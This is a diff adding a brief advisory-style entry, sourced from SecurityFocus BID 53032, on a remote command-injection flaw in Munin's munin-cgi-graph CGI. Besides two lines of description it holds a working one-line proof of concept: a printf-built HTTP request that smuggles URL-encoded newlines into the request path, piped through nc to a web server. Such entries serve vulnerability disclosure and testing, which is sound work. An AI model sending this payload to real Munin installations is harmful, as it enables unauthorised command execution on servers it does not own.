@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/53032/info
+
+Munin is prone to a remote command-injection vulnerability.
+
+Attackers can exploit this issue to inject and execute arbitrary commands in the context of the application. 
+
+printf 'GET /cgi-bin/munin-cgi-graph/%%0afoo%%0a/x/x-x.png HTTP/1.0\r\nHost: localhost\r\nConnection: close\r\n\r\n' | nc localhost 80 
